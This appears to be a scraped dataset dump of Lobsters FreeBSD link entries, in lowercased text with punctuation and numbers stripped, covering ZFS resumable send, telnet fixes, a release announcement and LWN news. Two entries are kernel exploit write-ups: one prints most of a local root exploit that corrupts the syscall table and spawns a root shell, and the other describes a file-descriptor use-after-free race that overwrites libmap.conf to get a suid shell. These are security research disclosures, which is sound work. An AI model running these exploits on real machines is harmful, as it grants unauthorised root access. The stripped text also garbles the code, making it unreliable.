system today open source software movement gaining increased attention respect although linux system perhaps wellknown half utility come packaged drawn bsd distribution linux distribution also heavily dependent complier debugger development tool written free software foundation collectively csrg free software foundation linux kernel developer created platform open source software movement launched proud opportunity help pioneer open source software movement look forward day becomes preferred way develop buy software user company everywhere next chapter
230,Lobsters,freebsd,FreeBSD,Exploiting a No-Name FreeBSD Kernel Vulnerability,https://www.synacktiv.com/posts/exploit/exploiting-a-no-name-freebsd-kernel-vulnerability.html,exploiting noname freebsd kernel vulnerability,bug exploit cturte blog series freebsd kernel exploitation acknowledgement,bug closer look commit show invoking cdiocreadsubchannelsysspace ioctl data copied bcopy instead copyout primitive endows local attacker belonging operator group arbitrary write primitive kernel memory following code sufficient provoke kernel panic precisely kernel try fill data field residing address subchannel data least true vmware virtualized environment scsi cdrom device emulator return null byte filled kernel data field even medium present please note may case physical freebsd host include unistdh include errh include fcntlh include syscdioh include sysioctlh int main int argc char argv struct iocreadsubchannel info struct cdsubchannelinfo data int fd fd open ordonly oexcl ononblock fd errx failed open device infoaddressformat cdmsfformat infodataformat cdcurrentposition infodatalen infodata null ioctl fd cdiocreadsubchannelsysspace info close fd return exploit first consider environment smep supportedenabled case exploitation trivial one simply nullify upper byte entry syscall table map address userland copy shellcode finally trigger code execution invoking corrupted syscall order get work need determine address syscall table entry namely need resolve address symbol sysent hopefully freebsd provides useful primitive resolve kernel symbol kldsym hereafter rely snippet code cturte blog series freebsd kernel exploitation resolve needed symbol resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym errx failed resolve symbol warnx mapped lxn ksymsymname ksymsymvalue return ksymsymvalue exported sysent table hold element sysent structure struct sysent system call table int synarg number argument sycallt sycall implementing function aueventt syauevent audit event associated syscall systraceargsfunct sysystraceargsfunc optional argument conversion function syentry dtrace entry id systrace syreturn dtrace return id systrace syflags general flag system call sythrcnt see corrupt upper byte sycall member redirect system call code mapped userland case chose corrupt nosys syscall syscall purpose print message non supported syscalls define systarget sysent resolve sysent infodata struct cdsubchannelinfo sysent systarget ioctl fd cdiocreadsubchannelsysspace info syscall systarget finally elevate privilege map corrupted syscall address userland copy shellcode rely code cturt gain root privilege idea retrieve reference current running thread g base derive pointer ucred structure running process full code exploit given include stdioh include stdlibh include stringh include unistdh include inttypesh include errh include fcntlh include systypesh include sysmmanh include syscdioh include sysioctlh include sysparamh include syslinkerh include sysucredh include syssyscallh define systarget struct ucred cruid crruid crrgid struct proc char var struct ucred pucred struct thread void var struct proc tdproc resolve kernel symbol cturte code resolve char name struct kldsymlookup ksym ksymversion sizeof ksym ksymsymname name kldsym kldsymlookup ksym errx failed resolve symbol warnx mapped lxn ksymsymname ksymsymvalue return ksymsymvalue acquire root privs cturte code void root struct thread td struct ucred cred get td pointer asm volatile mov r td resolve cred cred td tdproc pucred escalate process root cred cruid cred crruid cred crrgid asm endpayload extern char endpayload int main int argc char argv int fd struct iocreadsubchannel info struct cdsubchannelinfo data sysaddr sysent start codesize mapsize void mem sysaddr resolve nosys start sysaddr sysaddr codesize void endpayload void root mapsize codesize pagesize pagesize mem mmap void start mapsize protreadprotwriteprotexec mapanonmapprivatemapfixed mem void start errx mmap failed memcpy mem root codesize warnx payload mapped n mem assume user operator group fd open ordonlyoexclononblock fd errx failed open device infoaddressformat cdmsfformat infodataformat cdcurrentposition infodatalen infodatalen sizeof struct cdsubchannelinfo corrupt syscall entry sysent resolve sysent infodata struct cdsubchannelinfo sysent systarget ioctl fd cdiocreadsubchannelsysspace info trigger code exec syscall systarget getuid system binsh close fd return ok easy part achieve code execution smep enabled strategy create several process write randomly kernel memory hope corrupt uid one forked process initial attempt total failure since freebsd system unlike linux structure holding user credential ucred shared among process hopefully trick system creates fresh ucred structure forked process calling setuid getuid maximize chance corrupt uid adopt following strategy fork several process ie process make call setuid getuid force creation new ucred structure essential make call creation process ucred structure sprayed continuously memory see figure obtain large memory area ucred structure aligned boundary ucred structure created parent process invokes periodically vulnerable ioctl starting base address determined debugging session process check loop uid altered include stdioh include stdlibh include stringh include unistdh include signalh include inttypesh include errh include fcntlh include systypesh include sysmmanh include syscdioh include sysioctlh include sysparamh include syslinkerh include semaphoreh struct shareddata int nbchild int nbucred int stop int main int argc char argv struct iocreadsubchannel info struct cdsubchannelinfo data int fd md int nbproc struct shareddata memory start pidt pid nbproc semt mutex seminit mutex md shmopen memory ocreat ordwr md errx failed create shared memory ftruncate md sizeof struct shareddata memory struct shareddata mmap null pagesize protread protwrite mapshared md memory errx failed mmap memset memory sizeof struct shareddata spray memory ucred struct int nbproc pidt pid fork pid errx failed fork pid memory nbchild nbproc sleep force ucred creation setuid getuid semwait mutex memory nbucred sempost mutex memory nbucred nbproc sleep getuid system id memory stop exit kill getpid sigstop else pid pid memory nbchild nbproc assume user operator group fd open ordonly oexcl ononblock fd errx failed open device infoaddressformat cdmsfformat infodataformat cdcurrentposition infodatalen infodata struct cdsubchannelinfo start memory nbucred nbproc usleep int ioctl fd cdiocreadsubchannelsysspace info int j j nbproc j kill pid j sigcont sleep infodata memory stop break close fd return poc successfully tested last release freebsd however please note strategy highly unreliable likely produce panic shell acknowledgement thanks fabien perigaud bruno pujos federico bento
231,Lobsters,freebsd,FreeBSD,Resuming ZFS send,https://oshogbo.vexillium.org/blog/66/,resuming zfs send,,one amazing functionality zfs possibility sending whole dataset one place another mechanism amazing create backup zfs based machine although issue functionality long time user sent big chunk data would network connection disappeared machine rebooted sending snapshot long time nt option send snapshot beginning limitation already bad enough however another downside approach data already send thrown away therefore zfs go data remove dataset imagine terabyte data sent via network thrown away sending last byte network went offin short post nt want go whole zfs snapshot infrastructure think post would useful please leave comment get back point infrastructure used clone datasets time ago new feature called resuming zfs send introduced mean problem transmitting dataset one point another could resume throw away point yes finally choice let examine example let assume dataset named ztanktest data zfs list ztanktestname used avail refer mountpointztanktest tanktest probably know use zfs send zfs recv send recv dataset send whole dataset snapshot sending snapshot much handier dataset first send snapshot dataset nt unmounted case send dataset another advantage send data incrementally one snapshot another one something want discus let send dataset ztanktest let receive dataset ztanknewtest zfs send ztanktest zfs recv ztanknewtest mine time see new dataset created size growing zfs list ztanknewtestname used avail refer mountpointztanknewtest tanknewtest sending nt finish let cancel middle sending happen zfs list ztanknewtestcannot open ztanknewtest dataset exist whole data sent almost thrown away zfs say zfs throw away data accomplished passing option receiving side default behavior zfs change let try one time zfs send ztanktest zfs recv ztanknewtest time also canceled middle time file system destroyed zfs list ztanknewtestname used avail refer mountpointztanknewtest tanknewtest try mount fail whole dataset sent although error communicate could little bit helpful zfs mount tanknewtestcannot open tanknewtest dataset exist resume sending data fetch special token receiving site token kept zfs property reciveresumetoken name zfs get h value receiveresumetoken pas token send command inform point resume send use option tzfs send zfs recv ztanknewtest interruption need fetch new token resume sending exactly network would like abort send simply use command zfs recive option command clean evrything u zfs get h name value receiveresumetoken zfs recv ztanknewtest zfs get h name value receiveresumetoken ztanknewtestcannot open ztanknewtest dataset exist sending process interrupted ask zfs clean data send data dataset instead continue place interrupt occurred abort another option force send using f option rollback change basically mean rollback send resumable option work dataset would redirect blob zfs send command file way follow get token zfs resumable send interesting straightforward functionality help u save lot time bandwidth
232,Lobsters,freebsd,FreeBSD,fixing telnet fixes,https://flak.tedunangst.com/post/fixing-telnet-fixes,fixing telnet fix,fix couple snprintf buffer overflow c programming,freebsd commit telnet fix couple snprintf buffer overflow received bit attention various reason telnet etc thought take look random observationshere three new line patch unsigned int buflen strlen hbuf strlen cp char malloc sizeof char buflen snprintf char cp buflen hbuf first line indented space others use correct type string length sizet unsigned sizeof char always one need multiply need multiply size unsafe pattern use calloc something similar openbsd provides reallocarray avoid zeroing cost calloc return value malloc need cast fact lest disguise return value malloc checked reason cast cp char passing snprintf already type whole operation could simplified using although unlikely probably impossible generally adding two source length together overflow resulting truncation unchecked snprintf call asprintf avoids failure case posted jul tedu updated jul tagged c programming
233,Lobsters,freebsd,FreeBSD,FreeBSD 11.3-RELEASE Announcement,https://www.freebsd.org/releases/11.3R/announce.html,freebsd announcement,freebsd announcement availability http http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free download support acknowledgment trademark iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard rpib pandaboard wandboard virtual machine disk image checksum donation,freebsd announcement freebsd release engineering team pleased announce availability freebsd fourth release branch highlight clang llvm lld lldb compilerrt utility well libc updated upstream version elf tool chain updated version openssl updated version zfs filesystem updated implement parallel mounting loader updated extend geli support architecture pkg utility updated version kde desktop environment updated version gnome desktop environment updated version kernel log jail id logging process exit several feature addition update userland application several network driver firmware update warning feature deprecated future release printed freebsd version warning added ipsec algorithm deprecated rfc deprecation warning added weaker algorithm creating geli provider complete list new feature known problem please see online release note erratum list available information freebsd release engineering activity please see availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded described section hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available pgpsigned version announcement available purpose image provided part release follows contains everything necessary install base freebsd operating system documentation debugging distribution set small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg http ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amis available following region region region region region region region region region region region region region region region region region amis also available marketplace http compute instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance freebsd also available google compute marketplace completed thirdparty specific validation http consolecloudgooglecomlauncherbrowse filtercategory o filterprice free instance deployed using vagrant utility vagrant init vagrant download freebsd may downloaded via http following site freebsd virtual machine image may downloaded instruction installing freebsd updating existing machine please see support based new freebsd support model freebsd release series supported least september three month freebsd applicable please note supported three month release date currently scheduled october acknowledgment many company donated equipment network access human time support release engineering activity freebsd including freebsd foundation rubicon communication llc netgate yahoo netapp internet system consortium bytemark hosting cyberone data sentex communication new york internet juniper network netactuate national chiao tung university nlnet lab ixsystems release engineering team includes trademark freebsd registered trademark freebsd foundation iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard rpib pandaboard wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation
234,Lobsters,freebsd,FreeBSD,Exploiting FreeBSD-SA-19:02.fd,https://secfault-security.com/blog/FreeBSD-SA-1902.fd.html,exploiting,exploiting introduction advisory next section follows section last last section appendix bug analysis phrabricator instance phrack phile vulnerable path quite ago introduction next section exploitation strategy utilizing suid program memory corruption exchange file object write next section posting escalate root last section see appendix freebsd root exploit conclusion step appendix test setup virtualbox virtualbox setup argp kernel patch,exploiting posted july introduction february freebsd project issued advisory possible vulnerability handling file descriptor unixlike system freebsd allow send file descriptor process via unixdomain socket example used pas file access privilege receiving process inside kernel file descriptor used indirectly reference c struct store relevant information file object could instance include reference vnode describes file file system file type access privilege really happens unixdomain socket used send file descriptor another process receiving process inside kernel reference struct created new file descriptor reference file object information inherited instance allow give another process write access file drive even process owner normally able open file writable advisory describes freebsd introduced bug mechanism file descriptor information sent via socket sender receiver allocate buffer procedure receiving buffer large enough freebsd kernel attempt close received file descriptor prevent leak sender however responsible function close file descriptor fails release reference file descriptor file object could cause reference counter wrap advisory state impact bug possibly local privilege escalation gain root privilege jail escape however proofofconcept provided advisory author blog post catch describes secfault research exploit bug order obtain privilege escalation root next section bug analyzed make statement bug class guess possible exploitation primitive bug trigger addressed follows discussion three imaginable exploitation strategy including discussion two approach failed section last working exploit primitive discussed introduces least knowledge new exploitation technique kind vulnerability freebsd stabilization exploit addressed last section wrap everything conclusion point step challenge furthermore appendix describes test setup kernel patch accelerate exploit condition testing mentioned vulnerability backported freebsd development branch however vulnerability fixed branch present issue assigned cve nb reference code line referring vulnerable source tree shipped initial freebsd release source code found otherwise mentioned poc code downloaded bug analysis get first hint origin bug look patch revision freebsd release engineering branch good start revision mentioned advisory found phrabricator instance fix revision following void mdisposeextcontrolm struct mbuf nfd fd fds error fget td fd capnorights fp error error fdclose td fp fd fdrop fp td single call function mdisposeextcontrol file uipcsyscallsc added bug therefore introduced function lack call macro fdrop natural question purpose macro fdrop two argument fp td latter kernelpointer current thread former pointer struct file object defined line syssysfileh struct file void fdata file descriptor specific data struct fileops fop file operation struct ucred fcred associated credential struct vnode fvnode null applicable vnode short ftype descriptor type short fvnreadflags f sleep lock foffset volatile uint fflag see fcntlh volatile uint fcount reference count dtypevnode specific field int fseqcount count sequential access offt fnextoff next expected readwrite offset union struct cdevprivdata fvncdevpriv private data cdev struct fadviseinfo fvnadvice fvnun dflagseekable specific field offt foffset mandatory access control information void flabel placeholder mac label fdrop macro first call refcountrelease function atomically decrement fcount line struct definition return fcount le equal function called otherwise return value indeed macro call fdrop argument fdrop defined syskernkerndescripc int noinline fdrop struct file fp struct thread td int error fp fcount panic fdrop count fp fcount error foclose fp td atomicsubtractint openfiles crfree fp fcred free fp fadvice mfadvise umazfree filezone fp return error interesting line umazfree called internal kernel function free allocated chunk heap beyond scope document discus detail heap management inner working kernel allocator described argp karl phrack phile another great resource book design implementation freebsd operating mckusick et al purpose blog post following knowledge kernel heap sufficient freebsd heap allocator allows define zone used manage page chunk specific size creating allocate chunk heap umazalloc called parameter specifies zone function return pointer chunk taken bucket zone bucket empty new page allocated zone chopped chunk size example zone socket used allocate chunk size byte used kernel allocate heap space socket object anonymous zone like used call malloc kernel possible view available zone including stats command vmstat z heap chunk freed via umazalloc kernel put back bucket subsequent call malloc umazalloc attempt take chunk bucket lifo fashion moment interesting insight umazfree called filezone filezone refers special zone called file struct file type another function allocates struct file file eventually receive pointer freed fdrop last observation following fdclose call fdrop line implementation syskernkerndescripc fdclose struct thread td struct file fp int idx struct filedesc fdp td tdproc pfd filedescxlock fdp fdp fdofiles idx fdefile fp fdfree fdp idx filedescxunlock fdp fdrop fp td else filedescxunlock fdp description bug mention wrapping reference counter one see lack second fdrop lead overflow reference counter fcount respective struct file could ultimately lead useafterfree vulnerability clarify investigate exact purpose mdisposeextcontrolm vulnerable path vulnerable path mdisposeextcontrolm introduced single purpose described possible send file descriptor via unixdomain socket done function sendmsg allows put socalled control data message file descriptor sent using control message type scmrights however observed quite ago file descriptor leak buffer small bug comment state case big enough receiving buffer receiving process close already opened file descriptor due fact descriptor received however already received file descriptor processed reference file object created mentioned introduction file descriptor leaked close happen therefore new function mdisposeextcontrol introduced resolve issue reviewing line ff kernrecvit syskernuipcsyscallsc show call line int kernrecvit struct thread td int struct msghdr mp enum uioseg fromseg struct mbuf controlp mp msgcontrol controlp null ifdef compatoldsock endif ctlbuf mp msgcontrol len mp msgcontrollen mp msgcontrollen control null len mlen mnext error copyout mtod caddrt ctlbuf mlen goto ctlbuf mlen len mlen mp msgcontrollen mlen null mp msgflags msgctrunc mdisposeextcontrolm ultimately path followed message containing file descriptor control part sent recvmsg used receive message expect control message trigger mdisposecontrolm len line mlen bigger hence loop line executed assigned something different null control message sent message call mdisposeconstrolm following done create unixdomain socket allocate buffer big enough send message via socket contained file descriptor allocate buffer big enough receive message via socket contains file descriptor send message sendmsg receive message recvmsg bug reviewed line ff mdisposeextcontrolm taken view void mdisposeextcontrolm struct mbuf nfd fd fds error fget td fd capnorights fp error fdclose td fp fd interesting part call fget function eventually result call fgetunlocked extract pointer struct file object file descriptor fd save address pointer fp increment reference counter fcount struct file object however sending file descriptor already increase reference counter receiver hold file descriptor reference struct file object total reference counter therefore increased end fdclose line close file descriptor therefore remove reference struct take account fcount increased total due call fget therefore function result primitive increase fcount fcount type uint size bit overflow variable possible reasonable time done iterating primitive increase fcount result would need bit represent memory therefore bit higher bit removed variable wrap back used overflow fcount possible create useafterfree scenario achieve sending process need hold two file descriptor struct file done duplicating one file descriptor dup one file descriptor closed overflow fdrop called call see fcount struct file object freed explained however still possible reference freed chunk via second still opened file descriptor general idea clarified part important described detail trigger vulnerability wrinkle address first file opened open file descriptor duplicated dup result two file descriptor reference struct file object hence fcount next mdisposeextcontrolm triggered described repeatedly overflow fcount finally set quirk though one hand possible send arbitrary amount file descriptor case file descriptor need space message send kernel internally limited amount socalled mbufs available build message processing luckily enough sending file descriptor via socket increase reference counter multiple time mdisposeextcontrolm called decrement counter due preparation useafterfree need time virtual machine used research around minute moreover important note overflow result fcount fdrop called fcount result kernel panic refcountrelease check decremented counter le signal free fdrop asserts fcount exactly counter negative fdrop trigger panic wrapping fcount value one file descriptor closed trigger free fcount decrement thus fdrop called result struct file object released file bucket due former dup second file descriptor still reference freed struct file object invalid object marked invalid another quirk syscalls like read write use struct file result call fgetunlocked function check used file descriptor greater greatest valid one though therefore first file descriptor closed duplicated one typically greater far obtained file descriptor reference invalid struct file memory struct file reused another call open file descriptor actually become valid however point newly opened file dangling file descriptor used operation newly opened one share struct file right newly opened file descriptor inherited dangling one eg first file opened readonly second one writable dangling file descriptor used write newly opened file could exploited described next section one sum trigger strategy open file open duplicate file descriptor dup overflow fcount calling mdisposeextcontrol close first file descriptor trigger free call open allocate another struct file file zone resulting dangling file descriptor object first proofofconcept found triggeruafc notable result kernel panic program closed addressed final exploit interested reader try figure solution continuing read exploitation strategy section discus three possible exploitation strategy two failed research utilizing suid program one simplest strategy following possible trigger useafterfree executing suid program like passwd resulting dangling file descriptor file owned root including capability exploit would need place struct file object exactly file zone bucket needed suid program open file owned root like masterpasswd libmapconf writable could possible write file user context theory strategy work proofofconcept found file setuidtestclientc setuidtestserverc nb compiled setuidtestserverc rootowned suid course however finding program turned trickier expected utility standard installation open interesting file readonly close fast therefore approach dropped early memory corruption another typical approach would find way corrupting memory order simply execute userprovided code could mean overwrite eg function pointer inside struct file object another object could indirectly referenced struct file object indeed used similar technique exploit vulnerability playstation operating system based freebsd opened kqueue freebsd mechanism monitor kernel event kqueuefiles utilize fdata pointer struct file manage kqueue heap space allocated one anonymous zone therefore possible spray zone via ioctl overwrite function pointer described blog post significant difference vulnerability used one researched work though former allowed arbitrary free eg fdata pointer latter allows free struct file kernel clean interesting struct field pointer possible use primitive research possible object rely struct file investigated none allowed exploit vulnerability via memory corruption due described reason exchange file object write variation first strategy freebsd kernel check file opened writable soon user try write via file descriptor check passed write operation prepared executed creates basically timeofchecktimeofuse toctou scenario idea following time window passed check write operation creates race condition possible free struct file object via described vulnerability immediately open another file normally readonly user writecheck already done write operation executed happen readonly file struct file exchanged strategy finally successfully used exploit useafterfree gain root access described detail next section mentioned jann horn project zero exploited similar vulnerability linux used similar approach described posting project zero bug tracker escalate root described last section strategy basically timeofchecktimeofuse toctou attack write called file writable user syscall first check file referenced file descriptor indeed writable user result error otherwise check passed useafterfree vulnerability triggered rootowned readonly file opened user right check work following way write syscall result call kernel function syswrite syskernsysgenericc subsequently kernwritev file called call fgetwrite latter defined syskernkerndescripc function used retrieve struct file object file descriptor check write capability function call fget file static inline int fget struct thread td int fd struct file fpp int flag caprightst needrightsp seqt seqp struct filedesc fdp struct file fp int error fpp null fdp td tdproc pfd error fgetunlocked fdp fd needrightsp fp seqp switch flag case fread case fwrite fp fflag flag error ebadf break error fdrop fp td return error fpp fp return check seen line fflag field struct file set first call open file call write result check fwrite bit set therefore bit set user write privilege opened file following noted assumed useafterfree already prepared moment fcount variable overflowed call fgetunlocked increase fcount counter decreased end write operation however check successfully passed possible exchange file object via useafterfree plus another call open readonly file write happen second file first proofofconcept found testrdonlywritec note kernel patch needed test noted comment beginning file see appendix information check passed kernwritev call dofilewrite file static int dofilewrite struct thread td int fd struct file fp struct uio auio offt offset int flag fp ftype dtypevnode fp fvnreadflags fdevfsvnode bwillwrite error fowrite fp auio td tducred flag td function two interesting function call first one fowrite line function eventually result write operation safe assume file exchange happen function called race quite tight though likely win without primitive moreover race first try otherwise kernel panic case assumed mentioned fcount moment passed check therefore close called twice check yet passed write already finished fcount still fdrop assert reference counter exactly though two close would result negative reference counter function interprets counter signed integer panic would result failed assertion jann horn could delay linux kernel operation writing fuse file system delay write operation increase success rate win race condition possible standard freebsd installation fuse assumed loaded available respective user call bwillwrite line come help function function bufdirtycountsevere defined syskernvfsbioc bwillwrite void bufdirtycountsevere mtxlock bdirtylock bufdirtycountsevere bdirtywait msleep bdirtywait bdirtylock pribio flswai mtxunlock bdirtylock return true many dirty buffer int bufdirtycountsevere void return bitempty bufdomains bdhidirty line directly strike eye line call msleep read man page function put thread sleep without timeout check wakeup channel bdirtywait show thread woken bdirtywakeup called bufdaemon vfsbioc condition call msleep purpose bufdaemon connected kernel hold many dirty buffer ie buffer waiting write operation bufdirtycountsevere return bufdaemon woken flush order reduce count bdirtywakeup called wake write operation waiting line two kernel variable used water mark monitor two many dirty buffer lodirtybuffers hidirtybuffers set boot time depend available ram number dirty buffer greater hidirtybuffers bit bdhidirty line set bufdirtycountsevere return thus resulting msleep call therefore technique needed raise number dirty buffer fast experimenting easy way quickly identified exploit need open vast amount file stream reference file however file stream opened fopen corresponding file unlinked next call fopen number dirty buffer increase exploit attempt write file stream parallel demo technique found testdirtyc exploit work follows number dirty buffer high enough another thread get signal attempt write previously opened random file writable user simultaneously signal yet another thread given trigger useafterfree open file readonly user useafterfree triggered closing file descriptor used prepare userafterfree scenario duplicated one remember fcount equal opening readonly file result exchange struct file object increase chance race exploit useafterfree trigger thread writethread run different core possible useafterfree delayed microsecond latter done exploit likely result kernel panic useafterfree happens fast thus resulting panic triggered fdrop described proofofconcept arbitrary write found arbitaryfilewrite noted hammer thread synchronized otherwise resulting load still creating thread triggering vulnerability render unreliable exploit moreover synchronous write trigger msleep condition much faster still two challenge open final exploit gaining root preventing kernel panic latter achieved using primitive resulted reference counter overflow reason panic program attempt close file descriptor assumes open due useafterfree reference counter small though hence former mentioned assertion fdrop fails fcount exploited struct file time write operation due useafterfree following open write free file object call fdrop end therefore needed call open third time get file descriptor corrupt struct file reference counter increase primitive used increase fcount prevent kernel panic privilege escalation piece cake thanks technique used kingcope published freebsd root exploit writes file etclibmapconf configuration file used hook loading dynamic library program started exploit therefore creates dynamic library copy binsh another file set suidbit copy hooked library libutil instance called su therefore call su user afterwards result suid copy binsh final exploit found heavycyberweaponsh conclusion step past blog post showed exploitation simple yet easy overlook vulnerability freebsd useafterfree trigger quite simple develop research find way exploit vulnerability needed lot effort main reason seems reasonable good engineering kernel code scarce landscape writeups freebsd vulnerability author hope blog post contribute well latter help least another neighbor research best knowledge author blog post first describe working exploit vulnerability first describes needed technique exploitation technique come handy similar situation trigger useafterfree file zone well without major change kernel code remain moreover elegance logic exploit come shine using exploit without modification installation even cpu architecture eg exploit successfully tested arm processor end step mentioned moment exploit technique work ufs standard file system past nowadays zfs widely adopted freebsd installation however technique work zfs dirty buffer mechanism seems work different exists therefore msleep triggered render race condition unreliable chance high another delay mechanism found code render race condition reliable via lot parallel writes create dirty buffer seems inelegant maybe another way create write delay quickest way last least maybe completely different way exploit vulnerability example one could think tricking suid program read file intend read tricking su reading userprovided file instead etcpamdsu appendix test setup test debug exploit bug setup virtualbox chosen moreover kernel patch applied accelerate preparation useafterfree condition virtualbox setup already guide create test setup freebsd kernel debugging eg argp current update guide explains setup stepbystep get install everything new virtualbox vm use ufs apply hardening moment install source usrsrc ssh debug feature reboot installation forget disc image configure ssh user etc install gdb pkg pkg install gdb compile custom kernel following way cd create new file called debug add following content include generic ident debug makeoptions debugg option ddb option gdb option kdb create etcmakeconf cflagspipe content change usrsrcsysconfkernpremk execute cd usrsrc execute make buildkernel kernconfdebug execute make installkernel kernconfdebug execute reboot execute sysctl check possible enter debug mode note debugger start vm window ssh session clone machine use expert mode create linked clone leave rest clone target original debugger host target activate vm setting serial port host pipe check box connection pipe path could tmpfbsdpipe debugger check box connection pipe use path target boot target first change hostname wanted change bootdevicehints reboot target boot debugger change debug mode target execute gdb debugger session debugger execute cd kgdb b kerneldebug kgdb target remote debugger session target kgdb seen kernel patch ease exploit testing prevent wait long time span run patch mdisposeextcontrolm possible solution following line need added end function fp fcount fp fcount approach also need replace forloop code file prepares useafterfree following one basically reducing upper limit sending one file descriptor time sendrecv fd sv research another kernel patch used create long delay bwillwrite called add following ifcondition function call syskernsysgenericc fp ftype dtypevnode fp fvnreadflags fdevfsvnode bwillwrite fd pause need alter call open order open temporary file code file following fd opentmp perror opentmp exit fd last kernel patch used needed testrdonlywritec syskernsysgeneric following patch needed function kernwritev fgetwrite called fd asm result break point allow exchange struct file object described top comment proofofconcept
235,Lobsters,freebsd,FreeBSD,FreeBSD turns 26,https://lwn.net/SubscriberLink/791609/c9fb51359883f096/,freebsd turn,subscribing lwn sean kerner freebsd riscv fuse freebsd day coined quarterly report system architecture covered riscv foundation pmap libthr lld juno o documentation linux tool freebsd reported qemu bhyve filesystem userspace security trusted platform module patch freebsd foundation presentation pdf log,benefit lwn subscribersthe primary benefit subscribing lwn helping keep u publishing beyond subscriber get immediate access site content access number extra site feature please sign today june article contributed sean kerner freebsd operating system continuing make progress year got name among area work done improved support riscv fuse filesystem update c runtime change security improvement freebsd day celebrated june recognition date name freebsd coined fork project first official release freebsd occur november however ahead freebsd day project released quarterly report first quarter outlining ongoing effort addition quarterly report executive director freebsd foundation provided lwn insight state project foundation support system architecture case linux system architecture support constant ongoing area development improvement freebsd one newer architecture developer working riscv multiple new capability added processor last year lwn covered riscv support linux riscv growing effort support member organization riscv foundation got started riscv freebsd recently added support large page mapping memory percpu pmap activation tracking man page pmap module responsible managing hardwaredependent object page table address map tlbs etc quarterly report note work noticeably improves responsiveness freebsd running multicpu virtual machine debugging support riscv freebsd also making progress completion riscv implementation minidumps default type kernel crash dump providing content memory page used kernel still work need done debugging riscv gnu debugger gdb default tool used freebsd according report support debugging riscv kernel dump land develgdb next gdb release addition c runtime change made improve handling threadlocal storage tl freebsd dynamic linker fixed properly distribute tl initialization data thread initial segment required reasonably extensive perarchitecture change libc libthr lld improved mark library using initial exec tl mode appropriate flag measure make freebsd resilient improperly linked library support broadcom systemsonchip socs specifically soc series currently progress freebsd completed work expected merged second half quarterly report noted quadcore communication processor targeted networking application router gateway control plane processing na work enable support sponsored juniper network make use freebsd base juno o operating system networking equipment also note fact documentation running freebsd apple older mac mini hardware model shipped updated enabling new life older system moving forward goal information installation support including mac mini model detailed instruction installing freebsd operating system model itemised model specific information detailing freebsd support report said linux tool freebsd shortage tool unique freebsd also number tool come linux one tool syzkaller coverageguided systemcall fuzzer lwn reported began take shape back report described work recently number freebsd developer using syzkaller find fix bug freebsd kernel work ongoing improve syzkaller coverage freebsd system call particular syzkaller need taught target kernel entry point argument type order useful many standard posix system call already covered freebsdspecific system call work also ongoing enable better performance syzkaller freebsd challenge currently syzkaller run freebsd virtual machine vm via qemu hardwareacceleration support freebsd running syzkaller vm freebsd host perform well could fix issue work progressing add support bhyve hypervisor developed freebsd provide hardwareacceleration capability another technology familiar linux user filesystem userspace fuse getting much needed attention year freebsd fuse enables userspace program implement filesystem often used support outoftree filesystems freebsd fuse driver added gsoc project since time largely neglected fuse software buggy outofdate implementation year behind recent month developer working bring freebsd fuse driver date fixing existing bug raising driver api support level modern status security boot security also area developer working project trusted platform module tpm support added bringing freebsd date hardware security standard secure boot unified extensible firmware interface uefi system benefit new integration freebsd developer working secure boot support merged veriexec filesigning support creating new library named libsecureboot quarterly report explained library used verification kernel module loader library us bearssl cryptographic backend library support loading trusted blacklist certificate uefi dbdbx database use trust anchor verification library also used veriexec verify parse authentication database called manifest kernel previously manifest verified parsed userspace application sent kernel via devveriexec significant limitation security weakness freebsd merged patch implement address space layout randomization aslr first quarter aslr used way randomize memory location executables effort help limit memorybased attack aslr added report noted debate continues current forwardlooking value aslr provides implementation freebsd source tree make easily available wish use also move conversation past relative merit comprehensive security control freebsd foundation though freebsd project turning year freebsd foundation got started march mission support project deb goodkin hired foundation first employee led organization executive director ever since time small budget grown operational budget told lwn largest change bringing staff people handle freebsd advocacy software development fund outside software development project freebsd foundation nonprofit organization funded individual corporate donation far foundation received support commitment netapp netflix intel tarsnap beckhoff automation ecard vmware stormshield others according quarterly report plan continue commercial user give back help support freebsd goodkin said almost work foundation directly impact development explained staff developer step work thing allows change happen quickly especially nt volunteer project willing available foundation staff also participate working group within project provide guidance input improvement example noted ed maste director project development foundation charge git working group evaluating whether move project subversion git software revision control maste delivered presentation pdf freebsd vendor summit outlining area git use fit including potentially making future decision using git primary versioncontrol system project goodkin view exciting work foundation right freebsd advocacy education effort around world effort include teaching creating curriculum workshop getting started freebsd well promoting freebsd opensource computing conference said exciting outreach effort introducing people freebsd goal recruiting user contributor project freebsd mark anniversary goodkin optimistic project future next year see freebsd becoming wellknown popular operating system people organization recognizing valuing reliability security performance freebsd offer compelling solution variety application said overall clear year development freebsd development still active improvement bring older code date support new architecture like riscv work throughout project aim keep effort vibrant year come log post comment
